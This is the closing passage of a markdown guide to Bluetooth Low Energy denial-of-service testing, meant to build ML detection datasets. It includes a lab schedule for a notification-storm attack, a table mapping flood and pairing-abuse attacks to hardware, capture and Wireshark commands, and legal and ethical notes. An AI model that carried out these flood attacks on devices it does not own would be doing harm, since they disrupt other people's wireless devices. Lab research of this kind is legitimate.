        west build -b nrf52840dongle_nrf52840
        west flash
```

**Sunday (6 hours):**
```
10:00 - Prepare laptop script to receive notifications
        python3 laptop_receiver.py <nrf_address>
        - Connects
        - Enables notifications
        - Logs notification rate
        
11:00 - Run attack with captures
        Terminal 1: ubertooth-btle -f -c nrf_notification_storm.pcap
        Terminal 2: sudo btmon -w laptop_hci.log
        Terminal 3: python3 laptop_receiver.py ...
        
12:00 - Analyze results
        - Notification rate achieved
        - Laptop CPU usage
        - Packet loss (if any)
        
13:00 - Document nRF development process
        - Firmware customization steps
        - SoftDevice API usage
        - Debugging techniques (RTT logs)
        
14:00 - Plan next steps: more complex nRF attacks (pairing abuse, LL manipulation)
```

---

## 9. Safety & Legal Notes

### 9.1 Legal Considerations

**You MUST:**
- Only test on networks and devices you own
- Obtain written permission for any testing on organizational networks
- Comply with local laws regarding radio transmissions (FCC in US, equivalent elsewhere)
- Disable attacks immediately if unintended devices affected

**You MUST NOT:**
- Test in public spaces (airports, cafes, etc.)
- Target devices you don't own
- Use attacks for malicious purposes
- Share attack tools publicly without responsible disclosure context

### 9.2 Ethical Guidelines

- **Responsible disclosure:** If you discover vulnerabilities in commercial products, follow coordinated disclosure
- **Documentation:** Keep detailed logs of all testing (timestamps, devices, attacks)
- **RF safety:** Continuous high-power transmission can cause interference or violate regulations
- **Privacy:** BLE traffic may contain sensitive data (even if encrypted); handle PCAPs securely

### 9.3 Technical Safety

**Protect Your Devices:**
```bash
# Isolate test network
# Use separate Bluetooth adapters for attacker/victim
# Never run attacks on production systems

# Example: Firewall attacker laptop
sudo iptables -A OUTPUT -p bluetooth -j ACCEPT  # Allow only BT
sudo iptables -A OUTPUT -j DROP  # Drop all other traffic
```

**Prevent Interference:**
```bash
# Use RF-isolated environment if possible (shielded room)
# Monitor spectrum during tests
ubertooth-specan  # Check for other 2.4GHz activity

# Use attenuators on Ubertooth if testing close range
# (Prevents capturing unintended nearby devices)
```

---

## 10. Quick Reference

### 10.1 Attack-to-Hardware Mapping

| Attack | Laptop/RPi | nRF52840 | Ubertooth |
|--------|-----------|----------|-----------|
| Advertising flood | ✅ | ✅ | ⚠️ (experimental) |
| ATT Write flood | ✅ | ✅ | ❌ |
| L2CAP signaling | ✅ | ✅ | ❌ |
| Connection flood | ✅ | ✅ | ❌ |
| Notification storm | ⚠️ (as server) | ✅ | ❌ |
| SMP pairing abuse | ⚠️ (limited) | ✅ | ❌ |
| LL PDU manipulation | ❌ | ✅ | ❌ |
| **Passive sniffing** | ❌ | ⚠️ | ✅ |

### 10.2 Wireshark Filter Cheat Sheet

```
# Advertising
btle.advertising_header.pdu_type == 0  # ADV_IND
btle.advertising_header.pdu_type == 4  # SCAN_RSP

# Connection
btle.advertising_header.pdu_type == 5  # CONNECT_IND

# ATT
btatt.opcode == 0x0A  # Read Request
btatt.opcode == 0x12  # Write Request
btatt.opcode == 0x52  # Write Command (No Response)
btatt.opcode == 0x1B  # Notification

# L2CAP
btl2cap.cid == 0x0004  # ATT
btl2cap.cid == 0x0005  # Signaling
btl2cap.cid == 0x0006  # SMP

# SMP
btl2cap.cid == 0x0006 && btsmp.opcode == 0x01  # Pairing Request

# Errors
btatt.opcode == 0x01  # ATT Error Response
```

### 10.3 Useful Commands

```bash
# BlueZ
sudo systemctl stop bluetooth
sudo hciconfig hci0 down && sudo hciconfig hci0 up
sudo btmon -w capture.log
bluetoothctl scan on

# Ubertooth
ubertooth-btle -f -c capture.pcap  # Follow connections
ubertooth-btle -A 37 -c adv37.pcap  # Channel 37 only
ubertooth-specan  # Spectrum analyzer

# Wireshark
tshark -r capture.pcap -Y "btatt.opcode == 0x52" | wc -l  # Count writes
tshark -r capture.pcap -T fields -e frame.time_delta  # Inter-arrival times

# nRF
west build -b nrf52840dongle_nrf52840 <app>
west flash
```

### 10.4 Common PDU Types

| PDU Type (Hex) | Name | Layer |
|---------------|------|-------|
| 0x0 | ADV_IND | LL Adv |
| 0x1 | ADV_DIRECT_IND | LL Adv |
| 0x2 | ADV_NONCONN_IND | LL Adv |
| 0x3 | SCAN_REQ | LL Adv |
| 0x4 | SCAN_RSP | LL Adv |
| 0x5 | CONNECT_IND | LL Adv |
| 0x01 (LLID) | LL Data (continuation) | LL Data |
| 0x02 (LLID) | LL Data (start) | LL Data |
| 0x03 (LLID) | LL Control PDU | LL Data |

### 10.5 ATT Opcodes

| Opcode (Hex) | Name | Direction |
|-------------|------|-----------|
| 0x01 | Error Response | S→C |
| 0x0A | Read Request | C→S |
| 0x0B | Read Response | S→C |
| 0x12 | Write Request | C→S |
| 0x13 | Write Response | S→C |
| 0x52 | Write Command | C→S |
| 0x1B | Handle Value Notification | S→C |
| 0x1D | Handle Value Indication | S→C |

---

## Document Summary

This comprehensive guide covers:

1. ✅ **Attack Surface Map:** Layer-by-layer breakdown (PHY → LL → HCI → L2CAP → ATT → GATT → SMP)
2. ✅ **30+ Attacks:** DoS (primary), reconnaissance/MITM (context)
3. ✅ **Hardware Mapping:** What each device (Laptop/RPi5/nRF52840/Ubertooth) can do
4. ✅ **Full Implementations:** att_write_flood.py, adv_flood.py, capture_orchestrator.py
5. ✅ **Pseudocode:** For complex attacks (nRF firmware, LL manipulation)
6. ✅ **Dataset Pipeline:** Capture → feature extraction → labeling → ML training
7. ✅ **Failure Modes:** Controller limits, thermal throttling, stack interference
8. ✅ **Coding Requirements:** Python, C/C++, tools, learning path (beginner → advanced)
9. ✅ **Lab Recipes:** Weekend plans with hour-by-hour schedules
10. ✅ **RPi5 Specifics:** Broadcom limitations, USB adapter recommendations

**Next Steps:**
1. Start with Weekend 1 lab recipe (benign capture + first attack)
2. Implement capture_orchestrator.py for automation
3. Generate initial dataset (10 trials)
4. Train baseline ML model
5. Expand to nRF52840 for advanced attacks

**Questions? Need full code for specific attack? Ready to dive in!** 🚀


---

**Related**:
- [[BLE/DoS/README|DoS Overview]]
- [[BLE/DoS/03-dos-attack-cheatsheet|Quick Reference Cheatsheet]]
- [[BLE/01-protocol-overview|Protocol Overview]]
- [[BLE/Scripting/01-packet-crafting-basics|Packet Crafting]]
- [[BLE/README|BLE Home]]
